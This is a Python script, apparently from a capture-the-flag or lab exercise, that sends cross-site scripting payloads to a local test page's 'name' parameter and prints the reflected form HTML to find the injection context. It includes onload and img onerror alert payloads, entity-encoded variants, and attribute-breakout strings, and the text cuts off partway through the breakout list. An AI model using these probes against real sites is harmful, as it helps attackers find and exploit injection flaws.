import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# The most promising vectors from previous test
vectors = [
    ("After-tag attribute", "onload=alert('XSS')"),
    ("Decimal entity with full tag", "&#60;img src=x onerror=alert('XSS')&#62;"),
    ("Mixed entity with full tag", "&lt;img src=x onerror=alert('XSS')&gt;"),
]

print("=" * 70)
print("XSS Reflection Context Analysis - Full HTML")
print("=" * 70)
print()

for vector_name, payload in vectors:
    print(f"Testing: {vector_name}")
    print(f"Payload: {payload}")
    print()
    
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"{base_url}{endpoint}?name={encoded_payload}"
    
    response = requests.get(url, timeout=10)
    
    print(f"Full Response Length: {len(response.content)}B")
    print()
    
    # Extract the form section specifically to see reflection
    form_pattern = r'<form[^>]*>.*?</form>'
    form_match = re.search(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
    
    if form_match:
        form_html = form_match.group(0)
        print("FORM HTML:")
        print(form_html)
        print()
        
        # Look for the reflection point in the input tag
        input_pattern = r'<input[^>]*name=[^>]*>'
        input_match = re.search(input_pattern, form_html)
        
        if input_match:
            print("INPUT TAG:")
            print(input_match.group(0))
            print()
            
            # Check if our payload is after the input tag
            after_input = form_html[input_match.end():input_match.end()+500]
            print(f"CONTENT AFTER INPUT TAG: {after_input}")
            print()
        
        # Check if any HTML entities are being decoded by browser
        decoded_entities = []
        if '&#60;' in payload or '&lt;' in payload or '&gt;' in payload:
            decoded_entities.append('HTML entities present in payload')
        
        if decoded_entities:
            print(f"[!] HTML ENTITIES: {'; '.join(decoded_entities)}")
            print(f"    Browser may decode these on render, creating executable HTML")
            print()
    else:
        print("Could not find form in response")
        print(f"Response: {response.text[:500]}")
    
    print("-" * 70)
    print()

# Additional test: Try to determine if the reflection is inside an existing attribute
# by checking if we can break out and create our own
print("=" * 70)
print("Attribute Breakout Test")
print("=" * 70)
print()

breakout_vectors = [
    ("Breakout with >", "\"> onload=alert('XSS')"),
    ("Breakout with \\
